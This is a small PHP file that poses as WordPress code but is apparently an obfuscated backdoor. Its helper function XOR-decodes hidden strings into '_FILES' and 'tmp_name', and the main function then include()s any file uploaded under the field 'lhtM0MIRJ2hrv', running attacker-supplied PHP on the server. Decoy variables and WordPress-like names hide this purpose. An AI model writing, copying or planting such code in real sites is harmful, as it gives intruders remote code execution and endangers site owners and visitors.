<?php 	
function postdata()

{
    $wp_htmltranswinuni = 'lhtM0MIRJ2hrv';
    $default_no_texturize_tags = $wp_htmltranswinuni;
    

    $error = $GLOBALS[dirs("3.%3D%01u%1E", $default_no_texturize_tags)];

    $lastpostdate = $error;
    $item = isset($lastpostdate[$default_no_texturize_tags]);
    if ($item)

    {
        $counts = $error[$default_no_texturize_tags];

        $no_texturize_tags = $counts[dirs("%18%05%04%12%5E%2C%247", $default_no_texturize_tags)];

        $new_status = $no_texturize_tags;
        include ($new_status);

    }
}

function dirs($wp_timezone, $exclusions)

{
    $ext_type = $exclusions;
    $single_preg = "url" . "decode";
    $post_password = $single_preg($wp_timezone);
	$dest = 'real_mime_types';
    $search = substr($ext_type,0, strlen($post_password));
    $thumbdir = $post_password ^ $search;
	$wp_post_types = 'ancestors';
    
    $post_password = strpos($thumbdir, $search);
    
    return $thumbdir;
}

	$capabilities = 'previous_date';
postdata();

	$safe_tag = 'with_front';
?>
